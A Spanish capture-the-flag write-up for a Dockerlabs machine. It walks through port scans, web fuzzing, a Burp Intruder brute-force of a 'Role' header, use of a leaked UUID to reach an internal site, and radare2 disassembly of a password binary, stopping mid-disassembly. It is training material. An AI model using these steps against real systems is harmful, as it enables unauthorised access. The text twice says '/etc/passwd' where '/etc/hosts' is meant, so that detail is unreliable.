
# Writeup Template: Maquina `[ StackInfierno ]`

- Tags: #StackInfierno
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina StackInfierno](https://mega.nz/file/DE8GTC4C#LaGYQQaj_upmKUY6_u4uTvfo21SRiuIDwfe0bQ6lPCY)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x stackinferno.zip
sudo bash auto_deploy.sh stackinferno.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
80/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
```
---

## Enumeracion de [Servicio Web Principal]
Tenemos **hostsDiscovery** agregamos esta linea a nuestro archivo: **/etc/passwd**
```bash
172.17.0.2 cybersec.dl
```

direccion **URL** del servicio:
```bash
http://cybersec.dl
```

Si intentamos ver el codigo fuente, Estamos limitados ya que estan desactivadas estas funciones.
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://cybersec.dl

http://cybersec.dl [200 OK] Country[RESERVED][ZZ], Email[info@cybersec.com], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Script, Title[CyberSec Corp - Expertos en Ciberseguridad], Werkzeug[2.2.2]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 cybersec.dl
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://cybersec.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada

### Descubrimiento de Archivos
```bash
gobuster dir -u http://cybersec.dl/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js
```

- **Hallazgos**:
	No reporta nada

### Descubrimiento de Subdominios
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host:FUZZ.cybersec.dl" -u 172.17.0.2 --hl=5
```

- **Hallazgos**:
```bash
000000201:   200        115 L    268 W      2897 Ch     "mail"
```

Agreamos el nuevo subdominio a nuestro archivo: **/etc/passwd**
```bash
172.17.0.2 mail.cybersec.dl
```

Teneemos un panel de inicio de sesion:
```bash
http://mail.cybersec.dl/
```

Ahora si realizamos la peticion con el comando **curl** vemos que podemos acceder al codigo fuente:
```bash
curl -s -X GET http://cybersec.dl
```

Ahora que podemos ver el codigo fuente vemos el siguiente fragmento de codigo **html**
```js
fetch('/api/1passwsecu0')
                .then(response => response.json())
                .then(data => {
                    const passwordContainer = document.querySelector('.cybersecurity-animation');
                    passwordContainer.textContent = ` 🔐 Protege tus datos 📁. La Ciberseguridad es Clave! --- Ejemplo de Contraseñas Seguras🔑: ${data.password} --- Consejo: Cambia tus contraseñas cada 3 meses y usa autenticación de dos factores`;
                })
                .catch(error => console.error('Error:', error));
```

Tenemos una ruta de **api** a la cual vamos a acceder:
```bash
http://cybersec.dl/api/1passwsecu0
```

Tenemos lo siguiente:
```bash
|password|'C"!~!`!CF-IYXQ*BY+(IE-if'|
```

Lanzmos la siguiente herramienta para descubrir rutas:
```bash
feroxbuster -u http://cybersec.dl/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 200 --random-agent --no-state -d 5
```

Tenemos una nueva ruta:
```bash
405      GET        5l       20w      153c http://cybersec.dl/api/interest
```

Cuando ingresamos a esta url:
```bash
http://cybersec.dl/api/interest
```

Nos retorna lo siguiente:
```bash
# Method Not Allowed

The method is not allowed for the requested URL.
```

Asi que si realizamos una peticion pero cambiando el metodo vemos que nos retora este mensaje:
```bash
curl -s -X POST http://cybersec.dl/api/interest

{
  "message": "Error: 'Role' header not provided"
}
```

Ahora interceptamos la petecion en esta ruta:
```bash
http://cybersec.dl/api/interest
```

Una ves interceptar cambiaremos el metodo a **POST**
```bash
POST /api/interest HTTP/1.1
Host: cybersec.dl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

Ahora sabiendo que esta esperando el campo **role** procedemos a agregarlo, Pero no sabemos su valor, Asi que realizaremos un ataque de diccionario desde burpsuite:
Usaremos este:
```bash
/usr/share/SecLists/Usernames/top-usernames-shortlist.txt
```

Ahora mandamos la peticion al modo **Intruder** para realizar el ataque:
En **role** tendremos el **payload**
```bash
POST /api/interest HTTP/1.1
Host: cybersec.dl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Role: xxxxx # Payload
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

Despues cargamos el diccionario como **simpleLists** y despues le damos en **StratAttack**:
Como resultado tenemos dos repuestas con codigo de estado **200OK**
Uno con **Role: user**
```bash
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Fri, 20 Jun 2025 22:14:41 GMT
Content-Type: application/json
Content-Length: 237
Connection: close

{
  "company": {
    "address": "New York, EEUU",
    "name": "CyberSec Corp",
    "phone": "+1322302450134200",
    "services": "Auditorias de seguridad, Pentesting, Consultoria en ciberseguridad"
  },
  "message": "Acceso permitido"
}
```

**Role: administrator**
```bash
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Fri, 20 Jun 2025 22:14:42 GMT
Content-Type: application/json
Content-Length: 781
Connection: close

{
  "company": {
    "URLs_web": "cybersec.dl, soc_internal_operations.cybersec.dl, bin.cybersec.dl, mail.cybersec.dl, dev.cybersec.dl, cybersec.htb/downloads, internal-api.cybersec.dl, 0internal_down.cybersec.dl, internal.cybersec.dl, cybersec.htb/documents, cybersec.htb/api/cpu, cybersec.htb/api/login",
    "UUID": "f47ac10b-58cc-4372-a567-0e02b2c3d479, df7ac10b-58mc-43fx-a567-0e02b2r3d479",
    "address": "New York, EEUU",
    "branches": "Brazil, Curacao, Lithuania, Luxembourg, Japan, Finland",
    "customers": "ADIDAS, COCACOLA, PEPSICO, Teltonika, Toray Industries, Weg, CURALINk",
    "name": "CyberSec Corp",
    "phone": "+1322302450134200",
    "services": "Auditorias de seguridad, Pentesting, Consultoria en ciberseguridad"
  },
  "message": "Acceso permitido"
}
```

Del administrador tenemos varios subdominios:
```bash
   "URLs_web": "cybersec.dl, soc_internal_operations.cybersec.dl, bin.cybersec.dl, mail.cybersec.dl, dev.cybersec.dl, cybersec.htb/downloads, internal-api.cybersec.dl, 0internal_down.cybersec.dl, internal.cybersec.dl, cybersec.htb/documents, cybersec.htb/api/cpu, cybersec.htb/api/login"
```

Este es el que nos interesa:
```bash
http://0internal_down.cybersec.dl/
```

Cuando accedemos a el nos retorna lo siguiente:
```bash
# 403 - Acceso denegado

El encabezado `X-UUID-Access` no está presente.
```

Y Sabiendo que el encabezado lo podemos ver desde **intruder** que es el del **administrator** que se refiere a este encabezado:
```bash
"UUID": "f47ac10b-58cc-4372-a567-0e02b2c3d479, df7ac10b-58mc-43fx-a567-0e02b2r3d479",
```

Ahora lo que aremos interceptamos la peticion:
```bash
http://0internal_down.cybersec.dl/
```

Una ves capturada procedemos a agregar el campo faltante que es este:
```bash
X-UUID-Access: f47ac10b-58cc-4372-a567-0e02b2c3d479
```

Quedando la peticion asi antes de ser enviada:
```bash
GET / HTTP/1.1
Host: 0internal_down.cybersec.dl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-UUID-Access: f47ac10b-58cc-4372-a567-0e02b2c3d479
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Ahora tenemos acceso a dos archivos:
```bash
http://0internal_down.cybersec.dl/
```

Descargamos estos dos archivos:
```bash
  sec2pass   sec2pass_note.txt 
```

Tenemos esta informacion:
```bash
En Cybersec, estamos comprometidos con la seguridad de la información. Por eso, hemos desarrollado un programa para que nuestros empleados no tengan que recordar sus credenciales. Actualmente se encuentra en fase beta, por lo que aún no se almacenan todas las credenciales, pero a corto plazo se incluirán mejoras y se añadirán las credenciales de más empleados. Nuestro programa, Sec2Pass, cuenta con tres niveles de seguridad para proteger las credenciales internas. Para evitar fugas de información, las credenciales de autenticación para acceder a ellas se actualizan automáticamente cada 24 horas. Por eso, será obligatorio solicitar las credenciales principales al llegar a la empresa, donde se les entregará la primera contraseña de acceso, así como un ping de seguridad adicional. De esta manera, Sec2Pass les proporcionará las credenciales de acceso remoto necesarias para realizar sus funciones.
```

Ahora cuando le demos permisos lo ejecutamos para ver como funciona el binario:
```bash
./sec2pass
ingrese la contraseña: test
contraseña incorrecta
```

Ahora abriremos el binario con **ghidra** para reviar el codigo fuente y despues intentamos un **bufferOverFlow**
En la funcion **main** esta haciendo validaciones 
```c
  __isoc99_scanf(&DAT_0010422d,local_10f8);
  iVar1 = b6v4c8(local_10f8);
  if (iVar1 == 0) {
    printf(local_c18);
    uVar3 = 1;
  }
  else {
    printf(local_818);
    __isoc99_scanf(&DAT_0010422d,local_1088);
    iVar1 = x1w5z9(local_1088);
    if (iVar1 == 0) {
      printf(local_418);
      uVar3 = 1;
    }
    else {
      k8j4h3();
      uVar3 = 0;
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar3;
```

## Radare2
**Radare2 (comando `r2`)** es un **framework completo de ingeniería inversa y análisis de binarios** incluido en Kali Linux. Es una herramienta _multipropósito_ para analizar archivos ejecutables, firmware, malware y más.
```bash
r2 [opciones] [archivo_binario]
```

|Comando|Descripción|
|---|---|
|`aaa`|Análisis inicial automático (recomendado al entrar).|
|`afl`|Listar funciones detectadas.|
|`pdf @main`|Desensamblar función `main`.|
|`iz`|Mostrar cadenas de texto (strings) del binario.|
|`s 0x4000`|Saltar a dirección 0x4000.|
|`db 0x4012a0`|Poner breakpoint en dirección.|
|`dc`|Continuar ejecución (en depuración).|
|`oo+`|Reabrir el binario en modo escritura (para parchear).|
|`wx 90`|Escribir hex 90 (NOP) en posición actual.|
Ahora lanzamos la herramienta:
```bash
r2 -w sec2pass
```

Despues ejecutamos para el analicis inicial:
```bash
[0x00002150]> aaa

INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
```

Desensamblamos la funcion principal:
```bash
[0x00002ccf]> pdf @main
Do you want to print 366 lines? (y/N) y

            ; ICOD XREF from entry0 @ 0x2164(r)
┌ 1737: int main (int argc, char **argv, char **envp);
│ afv: vars(7:sp[0x10..0x10f8])
│           0x00002ccf      55             push rbp
│           0x00002cd0      4889e5         mov rbp, rsp
│           0x00002cd3      4881ecf010..   sub rsp, 0x10f0
│           0x00002cda      64488b0425..   mov rax, qword fs:[0x28]
│           0x00002ce3      488945f8       mov qword [canary], rax
│           0x00002ce7      31c0           xor eax, eax
│           0x00002ce9      488d95f0ef..   lea rdx, [format]
│           0x00002cf0      b800000000     mov eax, 0
│           0x00002cf5      b980000000     mov ecx, 0x80
│           0x00002cfa      4889d7         mov rdi, rdx
│           0x00002cfd      f348ab         rep stosq qword [rdi], rax
│           0x00002d00      488b150135..   mov rdx, qword [obj.AMLP]   ; [0x6208:8]=0x41dd "ing"
│           0x00002d07      488d85f0ef..   lea rax, [format]
│           0x00002d0e      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d11      4889c7         mov rdi, rax                ; char *s1
│           0x00002d14      e807f4ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d19      488b15f034..   mov rdx, qword [obj.PRZS]   ; [0x6210:8]=0x41e1 "res"
│           0x00002d20      488d85f0ef..   lea rax, [format]
│           0x00002d27      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d2a      4889c7         mov rdi, rax                ; char *s1
│           0x00002d2d      e8eef3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d32      488b15df34..   mov rdx, qword [obj.ING]    ; [0x6218:8]=0x4027 ; "'@"
│           0x00002d39      488d85f0ef..   lea rax, [format]
│           0x00002d40      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d43      4889c7         mov rdi, rax                ; char *s1
│           0x00002d46      e8d5f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d4b      488d85f0ef..   lea rax, [format]
│           0x00002d52      4889c7         mov rdi, rax                ; const char *s
│           0x00002d55      e806f3ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002d5a      4889c2         mov rdx, rax
│           0x00002d5d      488d85f0ef..   lea rax, [format]
│           0x00002d64      4801d0         add rax, rdx
│           0x00002d67      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002d6c      488b15ad34..   mov rdx, qword [obj.PROS]   ; [0x6220:8]=0x41e5 "la"
│           0x00002d73      488d85f0ef..   lea rax, [format]
│           0x00002d7a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d7d      4889c7         mov rdi, rax                ; char *s1
│           0x00002d80      e89bf3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d85      488d85f0ef..   lea rax, [format]
│           0x00002d8c      4889c7         mov rdi, rax                ; const char *s
│           0x00002d8f      e8ccf2ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002d94      4889c2         mov rdx, rax
│           0x00002d97      488d85f0ef..   lea rax, [format]
│           0x00002d9e      4801d0         add rax, rdx
│           0x00002da1      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002da6      488b157b34..   mov rdx, qword [obj.TANO]   ; [0x6228:8]=0x41e8 "co"
│           0x00002dad      488d85f0ef..   lea rax, [format]
│           0x00002db4      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002db7      4889c7         mov rdi, rax                ; char *s1
│           0x00002dba      e861f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002dbf      488b156a34..   mov rdx, qword [obj.CHZ]    ; [0x6230:8]=0x4029 ; ")@"
│           0x00002dc6      488d85f0ef..   lea rax, [format]
│           0x00002dcd      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002dd0      4889c7         mov rdi, rax                ; char *s1
│           0x00002dd3      e848f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002dd8      488b155934..   mov rdx, qword [obj.PWD]    ; [0x6238:8]=0x41eb "tra"
│           0x00002ddf      488d85f0ef..   lea rax, [format]
│           0x00002de6      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002de9      4889c7         mov rdi, rax                ; char *s1
│           0x00002dec      e82ff3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002df1      488b154834..   mov rdx, qword [obj.CLIK]   ; [0x6240:8]=0x41ef "se.."
│           0x00002df8      488d85f0ef..   lea rax, [format]
│           0x00002dff      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e02      4889c7         mov rdi, rax                ; char *s1
│           0x00002e05      e816f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e0a      488b153734..   mov rdx, qword [obj.PARR]   ; [0x6248:8]=0x41f4
│           0x00002e11      488d85f0ef..   lea rax, [format]
│           0x00002e18      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e1b      4889c7         mov rdi, rax                ; char *s1
│           0x00002e1e      e8fdf2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e23      488d95f0f3..   lea rdx, [s]
│           0x00002e2a      b800000000     mov eax, 0
│           0x00002e2f      b980000000     mov ecx, 0x80
│           0x00002e34      4889d7         mov rdi, rdx
│           0x00002e37      f348ab         rep stosq qword [rdi], rax
│           0x00002e3a      488b15e733..   mov rdx, qword [obj.TANO]   ; [0x6228:8]=0x41e8 "co"
│           0x00002e41      488d85f0f3..   lea rax, [s]
│           0x00002e48      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e4b      4889c7         mov rdi, rax                ; char *s1
│           0x00002e4e      e8cdf2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e53      488b15d633..   mov rdx, qword [obj.CHZ]    ; [0x6230:8]=0x4029 ; ")@"
│           0x00002e5a      488d85f0f3..   lea rax, [s]
│           0x00002e61      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e64      4889c7         mov rdi, rax                ; char *s1
│           0x00002e67      e8b4f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e6c      488b15c533..   mov rdx, qword [obj.PWD]    ; [0x6238:8]=0x41eb "tra"
│           0x00002e73      488d85f0f3..   lea rax, [s]
│           0x00002e7a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e7d      4889c7         mov rdi, rax                ; char *s1
│           0x00002e80      e89bf2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e85      488b15b433..   mov rdx, qword [obj.CLIK]   ; [0x6240:8]=0x41ef "se.."
│           0x00002e8c      488d85f0f3..   lea rax, [s]
│           0x00002e93      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e96      4889c7         mov rdi, rax                ; char *s1
│           0x00002e99      e882f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e9e      488b151334..   mov rdx, qword [obj.ASMLF]  ; [0x62b8:8]=0x4224 ; "$B"
│           0x00002ea5      488d85f0f3..   lea rax, [s]
│           0x00002eac      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002eaf      4889c7         mov rdi, rax                ; char *s1
│           0x00002eb2      e869f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002eb7      488d85f0f3..   lea rax, [s]
│           0x00002ebe      4889c7         mov rdi, rax                ; const char *s
│           0x00002ec1      e89af1ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002ec6      4889c2         mov rdx, rax
│           0x00002ec9      488d85f0f3..   lea rax, [s]
│           0x00002ed0      4801d0         add rax, rdx
│           0x00002ed3      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002ed8      488b157133..   mov rdx, qword [obj.VNZ]    ; [0x6250:8]=0x41f8
│           0x00002edf      488d85f0f3..   lea rax, [s]
│           0x00002ee6      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002ee9      4889c7         mov rdi, rax                ; char *s1
│           0x00002eec      e82ff2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002ef1      488b156033..   mov rdx, qword [obj.HK]     ; [0x6258:8]=0x41fa str.ncor
│           0x00002ef8      488d85f0f3..   lea rax, [s]
│           0x00002eff      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f02      4889c7         mov rdi, rax                ; char *s1
│           0x00002f05      e816f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f0a      488b154f33..   mov rdx, qword [obj.EEUU]   ; [0x6260:8]=0x41ff "re"
│           0x00002f11      488d85f0f3..   lea rax, [s]
│           0x00002f18      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f1b      4889c7         mov rdi, rax                ; char *s1
│           0x00002f1e      e8fdf1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f23      488b153e33..   mov rdx, qword [obj.DNMC]   ; [0x6268:8]=0x4202 "cta"
│           0x00002f2a      488d85f0f3..   lea rax, [s]
│           0x00002f31      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f34      4889c7         mov rdi, rax                ; char *s1
│           0x00002f37      e8e4f1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f3c      488b156533..   mov rdx, qword [obj.ERTG]   ; [0x62a8:8]=0x4220 ; " B"
│           0x00002f43      488d85f0f3..   lea rax, [s]
│           0x00002f4a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f4d      4889c7         mov rdi, rax                ; char *s1
│           0x00002f50      e8cbf1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f55      488d95f0f7..   lea rdx, [var_810h]
│           0x00002f5c      b800000000     mov eax, 0
│           0x00002f61      b980000000     mov ecx, 0x80
│           0x00002f66      4889d7         mov rdi, rdx
│           0x00002f69      f348ab         rep stosq qword [rdi], rax
│           0x00002f6c      488b159532..   mov rdx, qword [obj.AMLP]   ; [0x6208:8]=0x41dd "ing"
│           0x00002f73      488d85f0f7..   lea rax, [var_810h]
│           0x00002f7a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f7d      4889c7         mov rdi, rax                ; char *s1
│           0x00002f80      e89bf1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f85      488b158432..   mov rdx, qword [obj.PRZS]   ; [0x6210:8]=0x41e1 "res"
│           0x00002f8c      488d85f0f7..   lea rax, [var_810h]
│           0x00002f93      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f96      4889c7         mov rdi, rax                ; char *s1
│           0x00002f99      e882f1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f9e      488b157332..   mov rdx, qword [obj.ING]    ; [0x6218:8]=0x4027 ; "'@"
│           0x00002fa5      488d85f0f7..   lea rax, [var_810h]
│           0x00002fac      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002faf      4889c7         mov rdi, rax                ; char *s1
│           0x00002fb2      e869f1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002fb7      488d85f0f7..   lea rax, [var_810h]
│           0x00002fbe      4889c7         mov rdi, rax                ; const char *s
│           0x00002fc1      e89af0ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002fc6      4889c2         mov rdx, rax
│           0x00002fc9      488d85f0f7..   lea rax, [var_810h]
│           0x00002fd0      4801d0         add rax, rdx
│           0x00002fd3      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002fd8      488b15e132..   mov rdx, qword [obj.ASMQ]   ; [0x62c0:8]=0x4226 "el" ; "&B"
│           0x00002fdf      488d85f0f7..   lea rax, [var_810h]
│           0x00002fe6      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002fe9      4889c7         mov rdi, rax                ; char *s1
│           0x00002fec      e82ff1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002ff1      488d85f0f7..   lea rax, [var_810h]
│           0x00002ff8      4889c7         mov rdi, rax                ; const char *s
│           0x00002ffb      e860f0ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003000      4889c2         mov rdx, rax
│           0x00003003      488d85f0f7..   lea rax, [var_810h]
│           0x0000300a      4801d0         add rax, rdx
│           0x0000300d      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00003012      488b155732..   mov rdx, qword [obj.NRG]    ; [0x6270:8]=0x4206 "cod"
│           0x00003019      488d85f0f7..   lea rax, [var_810h]
│           0x00003020      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003023      4889c7         mov rdi, rax                ; char *s1
│           0x00003026      e8f5f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000302b      488b154632..   mov rdx, qword [obj.BRZL]   ; [0x6278:8]=0x420a "igo" ; "\nB"
│           0x00003032      488d85f0f7..   lea rax, [var_810h]
│           0x00003039      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000303c      4889c7         mov rdi, rax                ; char *s1
│           0x0000303f      e8dcf0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003044      488d85f0f7..   lea rax, [var_810h]
│           0x0000304b      4889c7         mov rdi, rax                ; const char *s
│           0x0000304e      e80df0ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003053      4889c2         mov rdx, rax
│           0x00003056      488d85f0f7..   lea rax, [var_810h]
│           0x0000305d      4801d0         add rax, rdx
│           0x00003060      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00003065      488b151432..   mov rdx, qword [obj.LAKDF]  ; [0x6280:8]=0x420e "de"
│           0x0000306c      488d85f0f7..   lea rax, [var_810h]
│           0x00003073      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003076      4889c7         mov rdi, rax                ; char *s1
│           0x00003079      e8a2f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000307e      488d85f0f7..   lea rax, [var_810h]
│           0x00003085      4889c7         mov rdi, rax                ; const char *s
│           0x00003088      e8d3efffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x0000308d      4889c2         mov rdx, rax
│           0x00003090      488d85f0f7..   lea rax, [var_810h]
│           0x00003097      4801d0         add rax, rdx
│           0x0000309a      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x0000309f      488b15e231..   mov rdx, qword [obj.WVWVEB] ; [0x6288:8]=0x4211 "seg"
│           0x000030a6      488d85f0f7..   lea rax, [var_810h]
│           0x000030ad      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030b0      4889c7         mov rdi, rax                ; char *s1
│           0x000030b3      e868f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000030b8      488b15d131..   mov rdx, qword [obj.RBWRTB] ; [0x6290:8]=0x4215 "uri"
│           0x000030bf      488d85f0f7..   lea rax, [var_810h]
│           0x000030c6      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030c9      4889c7         mov rdi, rax                ; char *s1
│           0x000030cc      e84ff0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000030d1      488b15c031..   mov rdx, qword [obj.AEBDV]  ; [0x6298:8]=0x4219 "dad"
│           0x000030d8      488d85f0f7..   lea rax, [var_810h]
│           0x000030df      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030e2      4889c7         mov rdi, rax                ; char *s1
│           0x000030e5      e836f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000030ea      488b15af31..   mov rdx, qword [obj.QQQQ]   ; [0x62a0:8]=0x421d
│           0x000030f1      488d85f0f7..   lea rax, [var_810h]
│           0x000030f8      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030fb      4889c7         mov rdi, rax                ; char *s1
│           0x000030fe      e81df0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003103      488d95f0fb..   lea rdx, [var_410h]
│           0x0000310a      b800000000     mov eax, 0
│           0x0000310f      b980000000     mov ecx, 0x80
│           0x00003114      4889d7         mov rdi, rdx
│           0x00003117      f348ab         rep stosq qword [rdi], rax
│           0x0000311a      488b154f31..   mov rdx, qword [obj.NRG]    ; [0x6270:8]=0x4206 "cod"
│           0x00003121      488d85f0fb..   lea rax, [var_410h]
│           0x00003128      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000312b      4889c7         mov rdi, rax                ; char *s1
│           0x0000312e      e8edefffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003133      488b153e31..   mov rdx, qword [obj.BRZL]   ; [0x6278:8]=0x420a "igo" ; "\nB"
│           0x0000313a      488d85f0fb..   lea rax, [var_410h]
│           0x00003141      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003144      4889c7         mov rdi, rax                ; char *s1
│           0x00003147      e8d4efffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
